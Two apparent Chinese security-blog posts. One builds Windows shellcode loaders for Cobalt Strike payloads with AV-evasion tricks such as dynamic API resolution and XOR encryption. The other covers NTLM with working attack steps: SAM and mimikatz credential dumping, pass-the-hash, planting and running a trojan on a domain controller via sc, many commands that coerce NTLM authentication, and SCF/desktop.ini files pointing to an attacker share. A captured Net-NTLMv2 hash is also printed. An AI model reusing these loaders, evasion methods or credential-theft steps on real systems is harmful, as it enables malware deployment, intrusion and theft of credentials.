[{"title":"初始shellcode加载器（持续更新）","url":"/2024/11/09/初识shellcode加载器/","content":"\n\n\n\n\n\n\n‍\n\nshellcode 这个概念本应来自pwn,shellcode为16进制的机器码，因为经常让攻击者获得shell而得名\n\n‍\n\nShellcode 是一组通常用汇编语言编写的机器代码指令，旨在由计算机处理器直接执行。因为汇编指令是特定于体系结构的，这限制了 shellcode 在不同处理器之间的可移植性\n\n‍\n\n为什么需要shellcode 加载器\n\n使用cs或者msf生成的exe远控木马，特征极强，当使用shellcode 加载的方式上线，更容易做免杀操作,接下来的是Windows下的shellcode加载器\n\n‍\n\n‍\n\n## shellcode 生成\n\n暂且现在水平有限，还不会手搓shellcode，使用工具生成shellcode\n\n‍\n\n#### cs\n\n<img src=\"/img/24-11-9/1.png\">\n\n选择监听器\n\n<img src=\"/img/24-11-9/2.png\">\n\n‍\n\n## shellcode加载步骤\n\n基本都是差不多的步骤\n\n1. 向操作系统申请一段可写可执行的内存\n2. 将shellcode 拷贝到申请的内存中\n3. 将程序的EIP指向shellcode区域，执行shellcode\n\n‍\n\n‍\n\n1. **申请虚拟内存**\n\nwindows中最常见的Windows API就是`VirtualAlloc`​\n\n```c++\nLPVOID VirtualAlloc(\n  [in, optional] LPVOID lpAddress,\t\t// 指定分配内存的起始地址，NULL表示由系统决定地址\n  [in]           SIZE_T dwSize,\t\t\t // 分配的内存大小（字节数）\n  [in]           DWORD  flAllocationType,\t// 内存的分配类型\n  [in]           DWORD  flProtect\t\t\t// 内存区域的保护属性\n);\n```\n\n* **flAllocationType**：指定内存分配的方式，常用值如下：\n\n  * ​`MEM_COMMIT`​：将内存页面从保留状态变为提交状态，使其可读写。\n  * ​`MEM_RESERVE`​：保留一块虚拟地址空间，但不实际分配物理内存。与 `MEM_COMMIT`​ 搭配使用。\n  * ​`MEM_RESET`​：通知系统内存已不再需要，但并不影响该内存块的使用。\n  * ​`MEM_RELEASE`​：释放内存，将 `dwSize`​ 设为 `0`​ 。\n* **lProtect**：设置内存页面的访问权限，常用值包括：\n\n  * ​`PAGE_READONLY`​：只读访问。\n  * ​`PAGE_READWRITE`​：可读写访问。\n  * ​`PAGE_EXECUTE_READWRITE`​：可执行和读写访问。\n\n‍\n\n​`LPVOID`​ 是Windows API中的一种指针类型，定义在`<windows.h>`​中。实际上是一个指向任意类型的指针，通常定义为 `void*`​ 类型的别名。\n\n‍\n\n使用：\n\n```c\nPVOID p=NULL;\np= (char*)VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);\n```\n\n‍\n\n可以先申请为可读可写，然后使用VirtualProtect 修改权限,或者直接修改存储shellcode变量内存区域的权限\n\n‍\n\n```c++\n DWORD oldProtect;\n VirtualProtect((LPVOID)p, sizeof p, PAGE_EXECUTE_READWRITE, &oldProtect);\n```\n\n或者\n\n```c++\n VirtualProtect(&buf, sizeof buf, PAGE_EXECUTE_READWRITE, &oldProtect);\n```\n\n```c++\nBOOL VirtualProtect(\n  [in]  LPVOID lpAddress,\n  [in]  SIZE_T dwSize,\n  [in]  DWORD  flNewProtect,\n  [out] PDWORD lpflOldProtect\n);\n```\n\n​`[in] lpAddress`​:要更改访问保护属性的页面区域的起始页面的地址。\n\n​`[out] lpflOldProtect`​:指向变量的指针，该变量接收指定页面区域中第一页的先前访问保护值。如果此参数为**NULL**或未指向有效变量，则函数失败\n\n‍\n\n2. **拷贝到内存**\n\nmemcpy: c语言中标准函数，用于复制内存\n\n```c\nmemcpy(p,shellcode,sizeof (shellcode));\n```\n\n或者使用CopyMeory\n\n```c\nCopyMeory(shellcode,buf,sizeof(buf));\n```\n\n‍\n\n3. **执行shellcode**\n\n最简单的就是指针执行\n\n```c\n((  void(*)() ) p) ();\n```\n\n将指针p强制转为无返回参数的函数指针 调用\n\n‍\n\n‍\n\n最后代码：\n\n```c\n#include <stdio.h>\n#include <Windows.h>\n\n\nunsigned char buf[] = \"shellcode......\";\n\nint main() {\n    PVOID p=NULL;\n    p= (char*)VirtualAlloc(NULL,sizeof(buf),MEM_COMMIT,PAGE_EXECUTE_READWRITE);\n    memcpy(p,buf,sizeof (buf));\n    if (p==NULL){\n        printf(\"error\");\n    }\n    ((  void(*)() ) p) ();\n    return 0;\n}\n\n```\n\n关闭杀软,编译运行\n\n成功上线cs\n\n<img src=\"/img/24-11-9/3.png\">\n\n‍\n\n这个只是最简单的shellcode loader ，还没有任何的免杀操作，落地就会被杀软干掉，杀软静态检测都过不了\n\n‍\n\n通过代码大致了解了shellcode 如何去加载执行\n\n本质上，程序中shellcode存放的数据放在数据段，其不具备可执行权限，所以是不能直接执行的\n\n而我们需要做的正是将其具备RWX权限\n\n‍\n\n‍\n\n‍\n\n## 其他执行方式\n\n上面介绍了指针执行,下面还有几种执行方式\n\n‍\n\n#### 内联汇编\n\n只适用于x86\n\n指定编译器赋予数据段可读可写可执行权限\n\n```c\n#include <stdio.h>\n#include <Windows.h>\n\n#pragma comment(linker,\"/section:.data,RWE\")\n\nunsigned char buf[] = \"shellcode“;\n\nvoid asm_exe() {\n    __asm\n    {\n        lea eax, buf;\n        call eax;\n    }\n}\n```\n\n‍\n\n#### 线程执行\n\n可以去看PE文件中TLS表相关内容，可以注册回调函数，在进程或者线程创建或者销毁时候执行，类似与dll中的主函数\n\n‍\n\n```c\nvoid thread_exe() {\n    DWORD dwThread;\n    HANDLE hThread;\n    char* shellcode = (char*)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    CopyMemory(shellcode,buf,sizeof(buf));\n    hThread=CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)shellcode, NULL, NULL, &dwThread);\n    WaitForSingleObject(hThread, INFINITE);\n}\n```\n\n‍\n\n‍\n\n‍\n\n## 一点点Bypass\n\n一些免杀思路：\n\n1. 对shellcode加密：杀软可能扫描字符串，并且未加密 的shellcode 静态扫描就能暴露 c2地址\n2. 调用功能相似的api: 替换调一些常用api\n3. 使用`LoadLibraryA`​动态加载调用函数：上篇PE文件结构里面就提到过，导入表，调用外部的函数，将会出现在导入表中，这样杀软可以扫描导入表来判断\n4. shellcod 与加载器分离，分离加载\n\n‍\n\n除此之外呢，还可以编写驱动程序，上升为内核态与安全设备对抗\n\n‍\n\n#### 动态获取函数\n\nLoadLibraryA 加载一个dll, kerneal32.dll 基本每一个exe都会加载，所以加载这个dll没问题\n\n```c++\nHMODULE LoadLibraryA(\n  [in] LPCSTR lpLibFileName\n);\n```\n\n返回值是模块的句柄。\n\n```c++\n  HMODULE hKernel32 = LoadLibraryA(\"Kernel32.dll\");\n```\n\nGetProcAddress 获取 函数地址\n\n```c++\nFARPROC GetProcAddress(\n  [in] HMODULE hModule,\n  [in] LPCSTR  lpProcName\n);\n```\n\n​`[in] hModule`​ ：包含函数或变量的 DLL 模块的句柄。 [LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) 、 [LoadLibraryEx](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa) 、 [LoadPackagingLibrary](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-loadpackagedlibrary)或[GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)函数返回此句柄。\n\n如果函数成功，返回值是导出函数或变量的地址。\n\n```c++\nGetProcAddress(hKernel32, \"VirtualAlloc\");\n```\n\n‍\n\n‍\n\n```c++\nint main() {\n\n    typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID, DWORD, DWORD, DWORD);\n    typedef BOOL(WINAPI* pVirtualProtect)(LPVOID, DWORD, DWORD, PDWORD);\n    typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);\n    typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);\n\n    HMODULE hKernel32 = LoadLibraryA(\"Kernel32.dll\");\n    pVirtualAlloc PVirtualAlloc = (pVirtualAlloc)GetProcAddress(hKernel32, \"VirtualAlloc\");\n    pVirtualProtect PVirtualProtect = (pVirtualProtect)GetProcAddress(hKernel32, \"VirtualProtect\");\n    pCreateThread PCreateThread = (pCreateThread)GetProcAddress(hKernel32, \"CreateThread\");\n    pWaitForSingleObject PWaitForSingleObject = (pWaitForSingleObject)GetProcAddress(hKernel32, \"WaitForSingleObject\");\n  \n    DWORD oldProtect=0;\n    BOOL flag=PVirtualProtect(&buf, sizeof buf, PAGE_EXECUTE_READWRITE, &oldProtect);\n    DWORD dwTHread;\n    HANDLE hThread = PCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)(CHAR*)buf, NULL, NULL, &dwTHread);\n    PWaitForSingleObject(hThread, INFINITE);\n    return 0;\n}\n\n```\n\n‍\n\n‍\n\n此外还可以进一步隐藏行为，遍历当前进程的PEB和TEB拿到Kernernal32的基址（后续更新）\n\n‍\n\n‍\n\n‍\n\n‍\n\nVirtualAlloc 可以进行替换\n\n```c++\nGlobalAlloc\nCoTaskMemAlloc\nRtlCreateHeap\nAllocADsMem\nReallocADsMem\n```\n\n‍\n\n‍\n\n### 加密\n\n杀软会扫描字符串，所以需要对原始的shellcode进行加密，通过静态检查\n\n#### xor\n\n```c++\nvoid xor_encrypt(unsigned char* data, int data_len, const char* key) {\n    int key_len = strlen(key);\n\n    for (int i = 0; i < data_len; i++) {\n        data[i] ^= key[i % key_len];  // 按密钥循环异或\n    }\n}\n```\n\n然后shellcode loader中存放加密的字符串，然后解密后进行加载\n\n‍\n\n## Reference\n","tags":["Windows","shellcode","免杀"],"categories":["Windows"]},{"title":"NTLM","url":"/2024/11/02/NTLM/","content":"\n\n\n\n\nNTLM 协议是 Microsoft 环境中使用的身份验证协议。特别是，它允许用户向服务器证明其身份，以便使用该服务器提供的服务。PTH在域渗透中并不陌生，hash 传递攻击 。NTLM Relay ,NTLM认证协议的中间人攻击,这些都设计到NTLM Hash 和Net-NTLM Hash 本文就来具体介绍\n\n\n\nThere are two possible scenarios:\n\n+ 用户使用服务器本地帐户的凭据，在这种情况下，服务器在其本地数据库中拥有用户的密码，并且能够对用户进行身份验证；\n+ 在Active Directory域环境中，用户在身份验证过程中使用域帐户，在这种情况下，服务器将必须要求域控制器验证用户提供的信息。\n\n## 基础知识\n### Local account\n服务器需要存储本地用户及其密码的哈希值。该数据库的名称是SAM （安全帐户管理器）。 SAM 可以在注册表中找到，特别是使用regedit工具，但仅当以SYSTEM身份访问时。可以使用[psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)作为SYSTEM打开它：\n\n```plain\npsexec.exe -i -s regedit.exe\n```\n\npsexec 是啥，先暂时跳过，之后再补\n\n\n\n在本地磁盘上对应着文件：C:\\Windows\\System32\\SAM\n\n\n\n因此它包含本地用户列表及其哈希密码，以及本地组列表。嗯，更准确地说，它包含哈希值的加密版本。但由于解密它们所需的所有信息也都在注册表中（SAM 和 SYSTEM），因此我们可以有把握地说它们的哈希版本存储在那里。如果你想了解解密是如何工作的，可以去查看[secretsdump.py代码](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py#L1124)或[Mimikatz代码](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c)。(嗯，解密代码先跳过)\n\n\n\n可以备份 SAM 和 SYSTEM 数据库以提取用户Hash\n\n\n\n首先我们将两个数据库保存在一个文件中:\n\n```powershell\nreg.exe save hklm\\sam save.save\nreg.exe save hklm\\system system.save\n```\n\n然后，我们可以使用[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)来提取这些哈希值\n\n```powershell\nsecretsdump.py -sam sam.save -system system.save LOCAL\n```\n\n使用Mimikatz 抓取Hash:\n\n```powershell\nprivilege::debug\nsekurlsa::logonpasswords\n```\n\n### Domain account\n使用域帐户完成身份验证后，用户的 NTLM Hash不再存储在服务器上，而是存储在域控制器上。用户想要验证的服务器收到其质询的答案，但它无法检查该答案是否有效。它将将此任务委托给域控制器。\n\n\n\n​\t为此，它将使用Netlogon服务，该服务能够与域控制器建立安全连接。这种安全连接称为安全通道。这种安全连接是可能的，因为服务器知道自己的密码，并且域控制器知道服务器密码的哈希值。他们可以安全地交换会话密钥并安全地进行通信。\n\n\n\n\n\n域控制器将在其数据库中查找用户的 NTLM哈希值。对于域控来说，它不在 SAM 文件中，因为它是尝试进行身份验证的域帐户。这次它位于一个名为NTDS.DIT的文件中，该文件是所有域用户的数据库。一旦检索到 NTLM 哈希值，它将使用该哈希值和质询计算预期响应，并将该结果与客户端的响应进行比较。\n\n\n\nNTLM 是认证协议，一般嵌套在其他协议之上，如SMB、LDAP 、HTTP\n\n\n\n抓取Hash 会再开一篇 具体学习\n\n\n\n## NTLM身份验证\n在Windows认证机制概述那篇文章上，大概讲述了NTLM身份验证的步骤\n\n现在再来具体看看\n\n​\tNTLM验证是一种Challenge/Response 验证机制，由三种消息组成:通常称为type 1(协商)，type 2(质询)和type 3(身份验证)。\n\n\n\n它基本上是这样工作的:\n\n<img src=\"/img/24-11-2/1.png\" >\n\n抓包：一般使用SMB 触发NTLM认证\n\n\n\n建立IPC共享：\n\n```powershell\nnet use \\\\192.168.120.139\\ipc$ <密码> /user:<用户名>\n```\n\nwireshark抓包\n\n<img src=\"/img/24-11-2/2.png\" >\n\n这里面的三个包，对应着NTLM 认证的三步\n\n### 1. 协商\n​\t由client端向server端请求（注意，这里并没有包含要认证的用户名） \n\n​\t这个过程是客户端向服务器发送type 1(协商)消息,它主要包含客户端支持和服务器请求的功能列表。\n\n主要包含以下结构：\n\n<img src=\"/img/24-11-2/3.png\" >\n\nSignature (8 bytes): 8字节 必须包含字符数组：(‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\\0’)\n\nMessageType (4 bytes): 表示消息类型，值必须为 0x0000001\n\n\n\n数据包如下：\n\n<img src=\"/img/24-11-2/4.png\" >\n\n协商的数据包可以看到，有许多的标志位，还有一些版本信息\n\n字段具体含义，见官方文档：[NEGOTIATE_MESSAGE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2)\n\n\n\n### 2.质询\n​\t由server端向client端响应，接着第一步这里只有服务端向客户端响应 \n\n​\t这个过程是服务器用type 2消息(质询)进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的Challenge。\n\n\n\n主要 包含以下结构：\n\n<img src=\"/img/24-11-2/5.png\" >\n\n其中最主要的信息是服务端返回的challenge。后面加密验证依赖于challenge\n\n<img src=\"/img/24-11-2/6.png\" >\n\nChanllenge 即 NTLM Server Challenge\n\n字段具体含义，见官方文档：[CHALLENGE_MESSAGE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786)\n\n### 3.身份验证\n​\t由client端向server端请求\n\n​\t这个过程客户端接收到challenge之后，使用用户hash与challenge进行加密运算得到response，将response,username,challenge发给服务器。消息中的response是最关键的部分，因为它向服务器证明客户端用户已经知道帐户密码。\n\n\n\n主要包含以下结构：\n\n<img src=\"/img/24-11-2/7.png\" >\n\n这里的Challeng不同于第二步中的Challenge，这里的Challenge是一个随机的客户端nonce。\n\n\n\nMIC是校验和，设计MIC主要是为了防止这个包中途被修改\n\n<img src=\"/img/24-11-2/8.png\" >\n\nsession_key是在要求进行签名的时候用的，用来进行协商加密密钥，可能有些文章会说session_key就是加密密钥，需要拥有用户hash才能计算出来，因此攻击者算不出来，就无法加解密包。但是想想就不可能，这个session_key已经在流量里面明文传输，那攻击者拿到之后不就可以直接加解密包了。当然这是后话，后面讲签名的时候会详细讲讲这个问题。\n\n\n\n如果想仔细理解每个字段的值请阅读官方文档[AUTHENTICATE_MESSAGE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce)\n\n\n\n\n\n### Net-ntlm hash\n\n​\t在第三步的响应中，存在6种响应类型：\n\n+ LM(LAN Manager)响应 (LM Response)- 由大多数较早的客户端发送，这是“原始”响应类型。\n+ NTLM v1响应(NTLM v1 Response) - 这是由基于NT的客户端发送的，包括Windows 2000和XP。\n+ NTLMv2响应 (NTLM v2 Response)- 在Windows NT Service Pack 4中引入的一种较新的响应类型。它替换启用了 NTLM版本2的系统上的NTLM响应。\n+ LMv2响应(LMv2 Response) - 替代NTLM版本2系统上的LM响应。\n+ NTLM2会话响应(NTLM2 Session Response) - 用于在没有NTLMv2身份验证的情况下协商NTLM2会话安全性时，此方案会更改LM NTLM响应的语义。\n+ 匿名响应(Anonymous Response) - 当匿名上下文正在建立时使用; 没有提供实际的证书，也没有真正的身份验证。“存 根”字段显示在类型3消息中。\n\n这六种使用的加密流程一样，都是前面我们说的Challenge/Response 验证机制,区别在Challenge和加密算法不同。\n\n\n\n这里我们侧重讲下NTLM v1响应和NTLMv2响应\n\n\n\n这些响应可以在本地安全策略→本地策略→安全选项→网络安全：LAN 管理器身份验证级别中配置。\n\n注册表位置为：HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\LmCompatibilityLevel\n\n| Value | Options | Description |\n| --- | --- | --- |\n| 0 | 发送 LM NTLM 响应 | 客户端使用 LM 和 NTLM 身份验证，而决不会使用 NTLMv2 会话安全；域控制器接受 LM、NTLM 和 NTLMv2 身份验证。 |\n| 1 | 发送 LM 和 NTLM - 如果已协商，则使用 NTLMv2 会话安全 | 客户端使用 LM 和 NTLM 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。 |\n| 2 | 仅发送 NTLM 响应 | 客户端只使用 NTLM 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。 |\n| 3 | 仅发送 NTLMv2 响应 | 客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器接受 LM、NTLM 和 NTLMv2 身份验证。 |\n| 4 | 仅发送 NTLMv2 响应/拒绝 LM | 客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器拒绝 LM，而只接受 NTLM 和 NTLMv2 身份验证。 |\n| 5 | 仅发送 NTLMv2 响应/拒绝 LM 和 NTLM | 客户端只使用 NTLMv2 身份验证并在服务器支持时使用 NTLMv2 会话安全。 域控制器拒绝 LM 和 NTLM，而只接受 NTLMv2 身份验证。 |\n\n\n各系统的默认值为：\n\n+ Windows 2000 以及 Windows XP: 发送 LM & NTLM 响应\n+ Windows Server 2003: 仅发送 NTLM 响应\n+ Windows Vista、Windows Server 2008、Windows 7 以及 Windows Server 2008 R2 及以上: 仅发送 NTLMv2 响应\n\n\n\n\n\n\n\n再次回顾NTLM v1 与NTLM v2的区别\n\n+ 长度区别：v2是16位的Challenge，而v1是8位的Challenge\n+ 加密算法区别：v1是将 16字节的NTLM hash空填充为21个字节，然后分成三组，每组7比特，作为3DES加密算法的三组密钥，加密Server发来的Challenge。 将这三个密文值连接起来得到response。\n\n而v2是的加密算法是\n\n\n\n(1). 将Unicode后的大写用户名与Unicode后的身份验证目标（在Type 3消息的\"TargetName\"字段中指定的域或服务器名称）拼在一起。请注意，用户名将转换为大写，而身份验证目标区分大小写，并且必须与“TargetName”字段中显示的大小写匹配。使用16字节NTLM哈希作为密钥，得到一个值。\n\n(2) 构建一个blob信息\n\n<img src=\"/img/24-11-2/9.png\" >\n\n(3). 使用16字节NTLMv2哈希作为密钥，将HMAC-MD5消息认证代码算法加密一个值(来自type 2的Challenge与Blob拼接在一起)。得到一个16字节的NTProofStr。\n\n(4). 将NTProofStr与Blob拼接起来形成得到response。\n\n至于选择哪个版本的响应由LmCompatibilityLevel决定。\n\n\n\nChallenge/Response验证机制即NTLM身份验证里面第三步 response里面包含Net-ntlm hash，NTLM v1响应和NTLMv2响应对应的就是Net-ntlm hash分为Net-ntlm hash v1和Net-ntlm hash v2。\n\n\n\nNet-ntlm hash v1的格式为：\n\n```powershell\nusername::hostname:LM response:NTLM response:challenge\n```\n\nNet-ntlm hash v2的格式为：\n\n```powershell\nusername::domain:challenge:HMAC-MD5:blob\n```\n\n+ 上面Net-NTLM中的challenge是第二步质询 服务器返回的challenge不是第三步中 流量包里面的client Challenge\n\n\n\n在上面数据包中也就是：e0b96d6854c55339\n\n+ HMAC-MD5对应第三个数据包中的NTProofSt\n\n在上面数据包中就是：50a43613edebfb8f15c0997c186fb8b3\n\n+ blob就是response(第三个数据包) 减去NTP1roofStr。(因为在计算response 的时候，response 就是由NTProofStr加上blob)\n\n\n\n在上面数据包中就是：0101000000000000c31a55f4590fdb018e1cea5409304e220000000002000c00590059004a0043004300430001001e00570049004e002d003100550056003000540048005100550054004300490004001400790079006a006300630063002e0063006f006d0003003400570049004e002d00310055005600300054004800510055005400430049002e00790079006a006300630063002e0063006f006d0005001400790079006a006300630063002e0063006f006d0007000800c31a55f4590fdb0106000400020000000800300030000000000000000100000000200000983757a7cf637c60e63e6f0edc446e3e98de62a80428c403ccafc73c02e0e0e70a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320030002e003100330038000000000000000000\n\n\n\n最后可以组合得到Net-NTLM v2 Hash:\n\n```powershell\nQueziya::yyjccc.com:e0b96d6854c55339:50a43613edebfb8f15c0997c186fb8b3:0101000000000000c31a55f4590fdb018e1cea5409304e220000000002000c00590059004a0043004300430001001e00570049004e002d003100550056003000540048005100550054004300490004001400790079006a006300630063002e0063006f006d0003003400570049004e002d00310055005600300054004800510055005400430049002e00790079006a006300630063002e0063006f006d0005001400790079006a006300630063002e0063006f006d0007000800c31a55f4590fdb0106000400020000000800300030000000000000000100000000200000983757a7cf637c60e63e6f0edc446e3e98de62a80428c403ccafc73c02e0e0e70a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100320030002e003100330038000000000000000000\n```\n\n## PTH\n这里就简单过一下，体会一下打pth,后续再详细学习\n\n### NTLM Hash 获取\n这里只介绍使用mimikazt,另外的已经另外写了一篇了\n\n1. 提升至debug 权限,拥有dump 内存的权限\n\n```powershell\nprivilege::debug\n```\n\n1. dump 本地hash\n\n```powershell\nsekurlsa::logonPasswords\n```\n\n或者读取SAM数据库获取用户Hash,获取系统所有本地用户的hash\n\n```powershell\ntoken::elevate\nlsadump::sam\n```\n\n### Hash 传递方式\n主要是通过445,135,139,5985 (http) 或 5986(https) 这四个端口的服务来进行的\n\n##### Mimikatz\n这个需要本地管理员权限\n\n```powershell\nprivilege::debug\nsekurlsa::pth /user:<用户名>  /domain:<域名或者workgroup> /ntlm:<ntlm-hash>\n```\n\n\n\n这里pth 只介绍用Mimikatz 打SMB 。当然，PTH远不止这一个手法\n\nMimikatz pth 成功后并不是直接拿到对方机器的shell，而是拿到对方SMB服务的权限，能直接使用SMB连接\n\n会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell\n\n```powershell\ndir \\\\192.168.120.139\\c$          //列举域控的C盘下的目录\n//为了进一步扩大战果，我们还可以把木马上传到域控下\ncopy hack.exe \\\\192.168.120.139\\c$       //上传木马hack.exe到域控的C盘下\n//在域控上创建服务启动木马,启动一个计划任务\nsc \\\\[computer-name.domain-name] create [service name] binpath=\"[file path]\"\n如：sc \\\\DC01.yyjccc.com create update binpath= \"c:\\hack.exe\"\nsc \\\\DC01.yyjccc.com start update         // 在域控上立即启动该服务\nsc \\\\DC01.yyjccc.com delete update      // 在域控上立即删除该服务\n\n或者直接连接域控,在本地计算机上创建一个网络驱动器z:映射到域控的c:。\nnet use z: \\\\192.168.120.139\\c$\n```\n\n<img src=\"/img/24-11-2/10.png\" >\n\n也是成功上传文件了不过cs木马落地就被Windows安全中心给杀了，后面再改进\n\n\n\n这个也大致讲了Mimikatz 打pth本质上还是利用IPC来横向移动（这个后面再开一篇学习）\n\n除此之外，某些情况下可以通过PTH+远程桌面进行横向\n\n\n\n这里pth攻击其实就是在本地起一个程序，然后注入hash凭证\n\n\n\n## NTLM Relay攻击\n### 概述\n也叫做NTLM重放攻击\n\n​\tNTLM是一个嵌入式协议，消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等，那ntlm的上层协议是smb的情况下,ntlm_relay就是smb_relay。那如果上层协议是http，我们也可以叫做http_relay，但是都统称ntlm_relay。消息的传输依赖于使用ntlm的上层协议，比如SMB,LDAP,HTTP等,那不管上层协议是啥，ntlm的认证总归是type 1,type 2,type3 。所以我们就不局限于之前提到的smb到smb这种relay，\n\n\n\n原理如图：\n\n<img src=\"/img/24-11-2/11.png\" >\n\nntlm relay的原理可以简述为，存在一个中间人，也就是攻击者，然后客户端认为他是服务端，服务端认为他是客户端。所以全程客户端都在和攻击者进行交互，然后攻击者将获得到的信息拿来和服务端交互，所以服务端认为攻击者是客户端，这样也就达到了伪造客户端进行认证的目的。\n\n关键点在于让受害者将Net-NTLM Hash 传递给攻击者,或者说是成为中间人\n\n\n\n有几个技术可以做到：\n\n+ ARP欺骗\n+ DNS 欺骗\n+ Windows IPv6 堆栈的错误配置\n+ NTBS (NetBIOS) / LLMNR 欺骗\n\n\n\n其实上面我现在只知道ARP欺骗\n\n\n\n通过上面手段，获取到的是Net-NTLM Hash\n\n\n\nResponder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具。\n\nResponder 项目地址：[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)\n\nResponder并不支持Windows\n\n\n\n**NTBS 和 LLMNR欺骗**\n\n在另外一篇中已经提到：[LLMNR\\NBT-NS\\MDNS欺骗](https://yyjccc.github.io/2024/10/10/LLMNR%E4%B8%8ENBTNS%E5%92%8CMDNS%E6%AC%BA%E9%AA%97/)\n\n事实上，在[网络渗透测试](https://www.vaadata.com/en/infrastructure-network-pentest/)期间，上面提到的方法可能会失败，因为网络的自动发现协议被禁用。\n\nRelay攻击在现实中也很难实现，关键点在与对于受害者的钓鱼，让受害者主动发起NTLM请求\n\n\n\n### 发起NTLM请求\n#### 网络命令\n使受害者发送NTLM请求\n\n下面一些命令可以让受害者发送NTLM请求\n\n```powershell\n> net.exe use \\hostshare \n> attrib.exe \\hostshare  \n> bcdboot.exe \\hostshare  \n> bdeunlock.exe \\hostshare  \n> cacls.exe \\hostshare  \n> certreq.exe \\hostshare #(noisy, pops an error dialog) \n> certutil.exe \\hostshare  \n> cipher.exe \\hostshare  \n> ClipUp.exe -l \\hostshare  \n> cmdl32.exe \\hostshare  \n> cmstp.exe /s \\hostshare  \n> colorcpl.exe \\hostshare #(noisy, pops an error dialog)  \n> comp.exe /N=0 \\hostshare \\hostshare  \n> compact.exe \\hostshare  \n> control.exe \\hostshare  \n> convertvhd.exe -source \\hostshare -destination \\hostshare  \n> Defrag.exe \\hostshare  \n> diskperf.exe \\hostshare  \n> dispdiag.exe -out \\hostshare  \n> doskey.exe /MACROFILE=\\hostshare  \n> esentutl.exe /k \\hostshare  \n> expand.exe \\hostshare  \n> extrac32.exe \\hostshare  \n> FileHistory.exe \\hostshare #(noisy, pops a gui)  \n> findstr.exe * \\hostshare  \n> fontview.exe \\hostshare #(noisy, pops an error dialog)  \n> fvenotify.exe \\hostshare #(noisy, pops an access denied error)  \n> FXSCOVER.exe \\hostshare #(noisy, pops GUI)  \n> hwrcomp.exe -check \\hostshare  \n> hwrreg.exe \\hostshare  \n> icacls.exe \\hostshare   \n> licensingdiag.exe -cab \\hostshare  \n> lodctr.exe \\hostshare  \n> lpksetup.exe /p \\hostshare /s  \n> makecab.exe \\hostshare  \n> msiexec.exe /update \\hostshare /quiet  \n> msinfo32.exe \\hostshare #(noisy, pops a \"cannot open\" dialog)  \n> mspaint.exe \\hostshare #(noisy, invalid path to png error)  \n> msra.exe /openfile \\hostshare #(noisy, error)  \n> mstsc.exe \\hostshare #(noisy, error)  \n> netcfg.exe -l \\hostshare -c p -i foo\n```\n\n通过让受害者执行上面命令，可以在responder中获取到Net-NTLM Hash值\n\n#### 系统图标\n这种方式比较鸡肋，不好钓鱼\n\n\n\n每个文件夹底下都有个文件desktop.ini来指定文件夹图标之类的，默认不可见，可以通过在控制面板中去掉\"隐藏受保护的操作系统文件\"看到\n\n\n\n资源管理器-> 查看 -> 选项 （win10）\n\n<img src=\"/img/24-11-2/12.png\" >\n\n每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到desktop.ini，可以尝试更改图标，就可以看到了\n\n<img src=\"/img/24-11-2/13.png\" >\n\n之后将图标路径改成UNC路径，指向我们的服务器,（改成网络路径）\n\n<img src=\"/img/24-11-2/14.png\" >\n\n\n\n<img src=\"/img/24-11-2/15.png\" >\n\n\n\n#### SCF文件利用\nscf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标，而IconFile是支持UNC路径的，以下是scf后缀的文件的格式\n\n```powershell\n[Shell]\nCommand=2\nIconFile=\\\\192.168.120.140\\scf\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n```\n\n\n\n新建test.scf，之后写入以上内容并将其放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash\n\n\n\n#### 